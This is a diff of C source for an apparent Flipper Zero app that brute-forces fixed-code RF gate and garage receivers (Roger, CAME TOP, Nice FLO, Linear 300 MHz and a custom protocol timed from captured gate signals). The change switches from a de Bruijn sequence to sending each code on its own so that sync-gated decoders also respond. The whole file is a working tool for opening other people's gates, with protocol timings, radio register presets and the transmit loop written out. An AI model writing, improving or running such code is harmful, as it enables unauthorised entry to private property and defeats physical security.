@@ -1,5 +1,6 @@
 // RF Gate Multi-Brand Brute-force for Flipper Zero
-// de Bruijn B(2,n) covers every n-bit code as an overlapping window in 2^n bits.
+// Per-code TX: sends sync + each code individually — works with all gate
+// receivers including sync-gated decoders (HT12D etc.).
 // Roger, CAME TOP, Nice FLO, Linear 300 MHz, Custom 480µs (measured).
 #include <furi.h>
 #include <furi_hal.h>
@@ -7,6 +8,8 @@
 #include <gui/gui.h>
 #include <gui/view_port.h>
 #include <input/input.h>
+#include <notification/notification.h>
+#include <notification/notification_messages.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -15,121 +18,111 @@
 typedef struct {
     const char* name;
     uint32_t    freq;
-    uint8_t     order;     // de Bruijn order = code bit-width
+    uint8_t     order;     // code bit-width; brute-forces 2^order codes
     uint16_t    sync_on;   // µs
     uint16_t    sync_off;
     uint16_t    bit1_on;
     uint16_t    bit1_off;
     uint16_t    bit0_on;
     uint16_t    bit0_off;
-    uint8_t     repeats;   // full-sequence passes
+    uint8_t     repeats;   // full sweeps through all codes
 } Protocol;
 
 // Timing values sourced from published protocol specs and Flipper SubGhz
-// implementation.  CAME/Nice/Linear values are approximate; adjust if your
-// hardware uses a non-standard variant.
-// "Custom 480us" timing measured directly from captured RAW signals
-// (Gate_inner.sub / Gate_outer.sub): te=480µs, 28-bit fixed code frame,
-// inter-frame gap ~11200µs.  12-bit de Bruijn covers the most common
-// DIP-switch code widths (4096 combos) in ~3.5 s.
+// implementation.  CAME/Nice/Linear values are approximate.
+// "Custom 480us" timing measured directly from captured RAW gate signals
+// (te=480µs, long=960µs, inter-frame gap=12000µs, 28-bit fixed-code frame).
 static const Protocol PROTOS[] = {
-    // name           freq        ord  sOn   sOff   1on  1off   0on  0off rep
+    // name            freq        ord  sOn   sOff   1on  1off   0on  0off rep
     { "Roger Gate",  433920000,  12,  100,  3100,  600,  200,  200,  600,  1 },
-    { "CAME TOP",    433920000,  12,  320,  9100,  320,  640,  640,  320,  3 },
-    { "Nice FLO",    433920000,  12,  500,  8500,  500, 1000, 1000,  500,  2 },
-    { "Linear 300",  300000000,  10, 1200, 10000,  600, 1200, 1200,  600,  3 },
-    { "Custom 480us",433920000,  12,  480, 12000,  960,  480,  480,  960,  3 },
+    { "CAME TOP",    433920000,  12,  320,  9100,  320,  640,  640,  320,  1 },
+    { "Nice FLO",    433920000,  12,  500,  8500,  500, 1000, 1000,  500,  1 },
+    { "Linear 300",  300000000,  10, 1200, 10000,  600, 1200, 1200,  600,  1 },
+    { "Custom 480us",433920000,  12,  480, 12000,  960,  480,  480,  960,  1 },
 };
 #define PROTO_COUNT ((uint8_t)(sizeof(PROTOS) / sizeof(PROTOS[0])))
 
 // ── CC1101 OOK 270 kHz async preset ──────────────────────────────────────────
 static const uint8_t PRESET_OOK270[] = {
-    0x02, 0x0D,
-    0x03, 0x47,
-    0x08, 0x32,
-    0x0B, 0x06,
-    0x14, 0x00,
-    0x13, 0x00,
-    0x12, 0x30,
-    0x11, 0x32,
-    0x10, 0x67,
-    0x18, 0x18,
-    0x19, 0x18,
-    0x1D, 0x40,
-    0x1C, 0x00,
-    0x1B, 0x03,
-    0x20, 0xFB,
-    0x22, 0x11,
-    0x21, 0xB6,
-    0x00, 0x00,
+    0x02, 0x0D,  0x03, 0x47,  0x08, 0x32,  0x0B, 0x06,
+    0x14, 0x00,  0x13, 0x00,  0x12, 0x30,  0x11, 0x32,
+    0x10, 0x67,  0x18, 0x18,  0x19, 0x18,  0x1D, 0x40,
+    0x1C, 0x00,  0x1B, 0x03,  0x20, 0xFB,  0x22, 0x11,
+    0x21, 0xB6,  0x00, 0x00,
     0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
-// ── De Bruijn B(2,n) — FKM algorithm ─────────────────────────────────────────
-#define DB_MAX_ORDER 12
-#define DB_MAX_LEN   (1 << DB_MAX_ORDER)
+// ── Per-code TX callback ──────────────────────────────────────────────────────
+// State machine generates [sync_on, sync_off, bit_0 on/off, ..., bit_N on/off]
+// for every code in 0..(2^order - 1), repeated `repeats` times.
+// No heap allocation required.
+typedef enum {
+    PHASE_SYNC_ON,
+    PHASE_SYNC_OFF,
+    PHASE_BIT_ON,
+    PHASE_BIT_OFF,
+} TxPhase;
 
-static int     g_db_order;
-static uint8_t s_db_a[DB_MAX_ORDER + 1];
-static uint8_t s_db_bits[DB_MAX_LEN];
-static size_t  s_db_len;
-
-static void db_gen(int t, int p) {
-    if(t > g_db_order) {
-        if(g_db_order % p == 0) {
-            size_t limit = (size_t)(1u << g_db_order);
-            for(int i = 1; i <= p && s_db_len < limit; i++)
-                s_db_bits[s_db_len++] = s_db_a[i];
-        }
-    } else {
-        s_db_a[t] = s_db_a[t - p];
-        db_gen(t + 1, p);
-        for(int j = (int)s_db_a[t - p] + 1; j <= 1; j++) {
-            s_db_a[t] = (uint8_t)j;
-            db_gen(t + 1, t);
-        }
-    }
-}
-
-// ── Async TX ─────────────────────────────────────────────────────────────────
-// One pass is allocated on the heap; the callback loops it rep_total times
-// so multi-pass protocols need no extra memory.
 typedef struct {
-    const LevelDuration* seq;
-    size_t               pass_len;
-    size_t               index;
-    uint8_t              rep_cur;
-    uint8_t              rep_total;
-    FuriSemaphore*       done;
-    volatile size_t*     progress;  // written from ISR, read for display only
-    volatile bool        signaled;
+    const Protocol* proto;
+    uint16_t        code;
+    uint16_t        total_codes;
+    uint8_t         pass;
+    uint8_t         bit;
+    TxPhase         phase;
+    uint8_t         bit_val;
+    FuriSemaphore*  done;
+    volatile size_t progress;
+    volatile bool   stop;
+    volatile bool   signaled;
 } TxState;
 
 static LevelDuration tx_callback(void* ctx) {
     TxState* s = ctx;
-    if(s->rep_cur >= s->rep_total) {
-        if(!s->signaled) {
-            s->signaled = true;
-            furi_semaphore_release(s->done);
+
+    if(s->phase == PHASE_SYNC_ON) {
+        if(s->stop || s->pass >= s->proto->repeats) {
+            if(!s->signaled) {
+                s->signaled = true;
+                furi_semaphore_release(s->done);
+            }
+            return level_duration_reset();
         }
-        return level_duration_reset();
     }
-    if(s->index < s->pass_len) {
-        if(s->progress) *s->progress = s->rep_cur * s->pass_len + s->index;
-        return s->seq[s->index++];
+
+    switch(s->phase) {
+    case PHASE_SYNC_ON:
+        s->phase = PHASE_SYNC_OFF;
+        return level_duration_make(true, s->proto->sync_on);
+
+    case PHASE_SYNC_OFF:
+        s->phase = PHASE_BIT_ON;
+        s->bit = 0;
+        return level_duration_make(false, s->proto->sync_off);
+
+    case PHASE_BIT_ON:
+        s->bit_val = (s->code >> s->bit) & 1;
+        s->phase = PHASE_BIT_OFF;
+        return level_duration_make(true, s->bit_val ? s->proto->bit1_on : s->proto->bit0_on);
+
+    default: { // PHASE_BIT_OFF
+        LevelDuration ld = level_duration_make(
+            false, s->bit_val ? s->proto->bit1_off : s->proto->bit0_off);
+        s->bit++;
+        if(s->bit < s->proto->order) {
+            s->phase = PHASE_BIT_ON;
+        } else {
+            s->code++;
+            if(s->code >= s->total_codes) {
+                s->code = 0;
+                s->pass++;
+            }
+            s->progress = (size_t)s->pass * s->total_codes + s->code;
+            s->phase = PHASE_SYNC_ON;
+        }
+        return ld;
     }
-    s->rep_cur++;
-    s->index = 0;
-    if(s->rep_cur < s->rep_total) {
-        if(s->progress) *s->progress = s->rep_cur * s->pass_len;
-        return s->seq[s->index++];
     }
-    if(s->progress) *s->progress = (size_t)s->rep_total * s->pass_len;
-    if(!s->signaled) {
-        s->signaled = true;
-        furi_semaphore_release(s->done);
-    }
-    return level_duration_reset();
 }
 
 // ── App ───────────────────────────────────────────────────────────────────────
@@ -140,7 +133,7 @@ typedef struct {
     FuriMutex*        mutex;
     AppState          state;
     uint8_t           sel;
-    volatile size_t   tx_progress;
+    size_t            tx_progress;
     size_t            tx_total;
 } AppCtx;
 
@@ -150,8 +143,8 @@ static void draw_cb(Canvas* canvas, void* ctx) {
     AppState state = app->state;
     uint8_t  sel   = app->sel;
     size_t   total = app->tx_total;
+    size_t   prog  = app->tx_progress;
     furi_mutex_release(app->mutex);
-    size_t prog = app->tx_progress;  // volatile; atomic 32-bit read is safe
 
     canvas_clear(canvas);
     canvas_set_font(canvas, FontPrimary);
@@ -159,7 +152,6 @@ static void draw_cb(Canvas* canvas, void* ctx) {
     if(state == STATE_MENU) {
         canvas_draw_str(canvas, 2, 10, "RF Gate Brute-Force");
         canvas_set_font(canvas, FontSecondary);
-        // Scrolling window: show 4 items centred on selected
         uint8_t first = (sel >= 2) ? (sel - 1) : 0;
         if(first + 4 > PROTO_COUNT) first = (PROTO_COUNT >= 4) ? PROTO_COUNT - 4 : 0;
         for(uint8_t vi = 0; vi < 4 && (first + vi) < PROTO_COUNT; vi++) {
@@ -224,6 +216,7 @@ int32_t roger_gate_app(void* p) {
     view_port_input_callback_set(vp, input_cb, &app);
     Gui* gui = furi_record_open(RECORD_GUI);
     gui_add_view_port(gui, vp, GuiLayerFullscreen);
+    NotificationApp* notif = furi_record_open(RECORD_NOTIFICATION);
     view_port_update(vp);
 
     bool running = true;
@@ -242,47 +235,27 @@ int32_t roger_gate_app(void* p) {
                 view_port_update(vp);
             } else if(ev.key == InputKeyOk) {
                 const Protocol* pr = &PROTOS[app.sel];
-
-                g_db_order = pr->order;
-                memset(s_db_a, 0, sizeof(s_db_a));
-                s_db_len = 0;
-                db_gen(1, 1);
-
-                size_t db_len   = (size_t)(1u << pr->order);
-                size_t pass_len = 2 + db_len * 2 + 1;
-                LevelDuration* seq = malloc(pass_len * sizeof(LevelDuration));
-                if(!seq) continue;
-
-                size_t wi = 0;
-                seq[wi++] = level_duration_make(true,  pr->sync_on);
-                seq[wi++] = level_duration_make(false, pr->sync_off);
-                for(size_t b = 0; b < db_len; b++) {
-                    if(s_db_bits[b]) {
-                        seq[wi++] = level_duration_make(true,  pr->bit1_on);
-                        seq[wi++] = level_duration_make(false, pr->bit1_off);
-                    } else {
-                        seq[wi++] = level_duration_make(true,  pr->bit0_on);
-                        seq[wi++] = level_duration_make(false, pr->bit0_off);
-                    }
-                }
-                seq[wi++] = level_duration_make(true, pr->bit1_on);
+                uint16_t total_codes = (uint16_t)(1u << pr->order);
 
                 furi_mutex_acquire(app.mutex, FuriWaitForever);
                 app.state       = STATE_TX;
                 app.tx_progress = 0;
-                app.tx_total    = pass_len * pr->repeats;
+                app.tx_total    = (size_t)total_codes * pr->repeats;
                 furi_mutex_release(app.mutex);
                 view_port_update(vp);
 
                 TxState tx = {
-                    .seq       = seq,
-                    .pass_len  = pass_len,
-                    .index     = 0,
-                    .rep_cur   = 0,
-                    .rep_total = pr->repeats,
-                    .done      = furi_semaphore_alloc(1, 0),
-                    .progress  = &app.tx_progress,
-                    .signaled  = false,
+                    .proto       = pr,
+                    .code        = 0,
+                    .total_codes = total_codes,
+                    .pass        = 0,
+                    .bit         = 0,
+                    .phase       = PHASE_SYNC_ON,
+                    .bit_val     = 0,
+                    .done        = furi_semaphore_alloc(1, 0),
+                    .progress    = 0,
+                    .stop        = false,
+                    .signaled    = false,
                 };
 
                 furi_hal_subghz_reset();
@@ -290,24 +263,30 @@ int32_t roger_gate_app(void* p) {
                 furi_hal_subghz_set_frequency_and_path(pr->freq);
                 furi_hal_subghz_tx();
                 furi_hal_subghz_start_async_tx(tx_callback, &tx);
+                notification_message(notif, &sequence_blink_start_red);
 
                 bool aborted = false;
                 while(true) {
                     if(furi_semaphore_acquire(tx.done, furi_ms_to_ticks(50)) == FuriStatusOk)
                         break;
+                    furi_mutex_acquire(app.mutex, FuriWaitForever);
+                    app.tx_progress = tx.progress;
+                    furi_mutex_release(app.mutex);
                     view_port_update(vp);
                     InputEvent pev;
                     while(furi_message_queue_get(app.queue, &pev, 0) == FuriStatusOk) {
-                        if(pev.type == InputTypeShort && pev.key == InputKeyBack)
+                        if(pev.type == InputTypeShort && pev.key == InputKeyBack) {
                             aborted = true;
+                            tx.stop = true;
+                        }
                     }
                     if(aborted) break;
                 }
 
                 furi_hal_subghz_stop_async_tx();
                 furi_hal_subghz_sleep();
+                notification_message(notif, &sequence_blink_stop);
                 furi_semaphore_free(tx.done);
-                free(seq);
 
                 furi_mutex_acquire(app.mutex, FuriWaitForever);
                 app.state = aborted ? STATE_MENU : STATE_DONE;
@@ -329,6 +308,7 @@ int32_t roger_gate_app(void* p) {
     }
 
     gui_remove_view_port(gui, vp);
+    furi_record_close(RECORD_NOTIFICATION);
     furi_record_close(RECORD_GUI);
     view_port_free(vp);
     furi_mutex_free(app.mutex);
